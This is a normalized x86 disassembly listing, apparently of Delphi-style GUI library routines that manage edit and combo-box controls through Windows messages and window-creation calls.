mov [ fs : eax ] edx
push sub_431c8c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_448484
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov edx eax
mov eax ebx
call sub_441d40
sub_431c90
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_448788
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_448484
push eax
call SendMessageA
sub_431ccc
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_431cf0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431d10
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_431d40
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448484
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_448484
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_431df8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_441cd8
inc eax
call sub_4091c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431e82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4091dc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_441ce8
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e89
mov eax [ ebp - 0xc ]
call sub_409214
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_431e94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40451c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_441cd8
inc eax
call sub_4091c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431f22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4091dc
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_441ce8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_409214
retn
sub_431f30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44530c
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_431fe9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_4456a4
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_4456a4
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_43205c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_43209b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44550c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4320a2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_4320a2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_431bd0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43211c
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
sub_43211c
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_432158
pop ebx
retn
sub_432158
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_421528
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_441544
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_432224
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_446098
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_43225c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_448484
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_448484
push eax
call SendMessageA
sub_43229c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447ae8
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_43211c
mov eax ebx
call sub_445ac0
sub_4322d0
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_432158
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_432318
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447884
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_431ddc
sub_432354
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_4038bc
push 0xfffffff0
mov eax esi
call sub_448484
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_43238c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov edx esi
mov eax ebx
call sub_44955c
pop esi
pop ebx
retn
sub_4323a8
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
call sub_448788
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_432418
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_40451c
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_43245c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax edi
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
sub_4324d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4325bb
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4325c2
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_404730
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404730
sub_4325cf
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
add edi esi
sub_43267c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x10 ]
call sub_442f30
mov eax [ esi + 0x10 ]
call sub_4422a0
sub_4326e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4327a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_4088c0
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_441cd8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0xc
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_441d64
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404828
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebx + 0x10 ]
call sub_442f30
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4327b0
lea eax [ ebp - 0xc ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4327b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_431a2c
mov edx 0xb9
mov eax ebx
call sub_441520
mov edx 0x59
mov eax ebx
call sub_441544
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x226 ] 0x1
mov [ ebx + 0x227 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x220 ] esi
mov [ esi + 0x10 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43283c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x220 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_43286c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_431f30
mov eax ebx
mov si 0xffc8
call sub_4038bc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x224 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x226 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
xor edx edx
mov dl [ ebx + 0x225 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_4328d0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push r-xdata
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call CreateWindowExA
mov [ esi + 0x180 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
push r-xdata
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call CreateWindowExA
mov edi eax
mov [ esi + 0x180 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x180 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_43299d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_448484
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_432a00
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_448484
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432aa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x228 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
sub_432ae4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4474b4
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_432b24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432b8a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432b91
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4178b0
sub_432b9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_432bc0
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
push eax
push esi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
mov edx esp
mov ecx edi
xchg ecx eax
call sub_40451c
add esp 0x1000
pop edi
pop esi
pop ebx
retn
xor eax eax
sub_432c04
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432c68
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_441d64
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_441d94
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c6f
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_432c74
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432c94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4048dc
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432cbc
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4422a0
sub_432cf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_441520
mov edx 0x19
mov eax ebx
call sub_441544
mov dl 0x1
mov eax ebx
call sub_4486b8
xor edx edx
mov eax ebx
call sub_441f28
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_433050
call sub_41f228
mov [ ebx + 0x24c ] eax
push ebx
push sub_433148
call sub_41f228
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_432de4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_41f2c0
mov eax [ esi + 0x24c ]
call sub_41f2c0
mov eax [ esi + 0x208 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_432e66
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_445914
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_432eb0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_448484
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_432ed4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_448484
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_448484
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_432f1c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_432f48
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_432f94
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_448484
push eax
call SetWindowTextA
sub_432ff4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_432eb0
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_43302c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447ae8
pop esi
pop ebx
retn
mov eax ebx
call sub_445ac0
sub_433050
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf0 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_4592cc
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xec ]
test al al
jne r-xdata
push esp
call GetCursorPos
